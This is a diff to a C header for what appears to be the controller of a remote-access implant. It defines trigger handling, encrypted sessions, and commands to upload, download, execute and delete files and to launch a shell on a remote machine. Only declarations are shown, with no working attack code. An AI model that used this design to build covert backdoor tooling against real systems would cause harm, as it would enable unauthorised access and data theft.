@@ -19,6 +19,9 @@
 #include <signal.h>
 #include <errno.h>
 
+#include "crypto.h"
+#include "trigger.h"
+
 /* Preprocessor Macros */
 #define DEFAULT_DELAY     30								/* default trigger delay */
 #define YES               1
@@ -26,15 +29,15 @@
 #define ERROR             -1
 
 /* FOLLOWING DEFINITIONS FOR EXIT THROUGH HELP ARE ALSO IN servers Shell.h file */
-#define EXIT              0                                /* command = ex for exit */
-#define UPLOAD            1                                /* command = ul for upload */
-#define EXECUTE           2                                /* command = exec for execute */
-#define UPLOADEXECUTE     3                                /* not implemented att */
-#define DOWNLOAD          4                                /* command = dl for download */
-#define DELETE            5                                /* command = del for delete */
-#define SHUTDOWNBOTH	  6				   /* command = shut for shutdown, compat.h defines SHUTDOWN as 2 for sockets */
-#define HELP              7                                /* command = help */
+#define UPLOAD				1			/* command = ul for upload */
+#define EXECUTE				2			/* command = exec for execute */
+#define UPLOADEXECUTE		3			/* not implemented */
+#define DOWNLOAD			4			/* command = dl for download */
+#define DELETE				5			/* command = del for delete */
+#define SHUTDOWNBOTH		6			/* command = shut for shutdown, compat.h defines SHUTDOWN as 2 for sockets */
+#define HELP				7			/* command = help */
 #define LAUNCHTRUESHELL		8
+#define EXIT              	10			/* command = ex for exit */
 
 #ifndef SUCCESS
 #define SUCCESS	0
@@ -92,8 +95,10 @@ union aword {
    } w;
 };
 
-#include "trigger.h"
-#include "ssl/crypto.h"
+typedef struct _REPLY {
+        unsigned long   reply;
+        unsigned long   padding;
+} REPLY;
 
 /* Function Prototypes */
 void Usage(char*);                                         /* definition: misc.c */
@@ -106,19 +111,19 @@ void FreeArgv(char**);                                     /* definition: parser
 char** BuildArgv(char*);                                   /* definition: parser.c */
 
 void Run(struct proc_vars*, struct trigger_params *);      /* definition: modes.c */
-void InteractiveMode( struct proc_vars *, ssl_context * );                   /* definition: modes.c */
+void InteractiveMode(struct proc_vars *, crypt_context *);                   /* definition: modes.c */
 void AutomaticMode(struct proc_vars*);                     /* definition: modes.c */
 
-int CommandToFunction(char**, struct proc_vars*, ssl_context * ); /* definition: functions.c */
+int CommandToFunction(char**, struct proc_vars*, crypt_context * ); /* definition: functions.c */
 int Upload(char**, struct proc_vars*);                     /* definition: functions.c */
 int Download(char**, struct proc_vars*);                   /* definition: functions.c */
 int Remove(char**, struct proc_vars*);                     /* definition: functions.c */
 int Execute(char**, struct proc_vars*);                    /* definition: functions.c */
 int StopSession(struct proc_vars*);                        /* definition: functions.c */
 void DisplayHelp(char*);                                   /* definition: functions.c */
-int SendFile(int, int);                               /* definition: functions.c */
-int RecvFile(int, int);                               /* definition: functions.c */
-void SendCommand(struct send_buf*, struct recv_buf*, struct proc_vars*);
+int SendFile(int, size_t);                                 /* definition: functions.c */
+int RecvFile(int, int);                                    /* definition: functions.c */
+void SendCommand(struct send_buf*, REPLY*, struct proc_vars*);
 
 void GenRandomBytes(char*, int, char*, int);               /* definition: crypto.c */
 //void BlowfishEncipher(unsigned long*, unsigned long*);     /* definition: crypto.c */
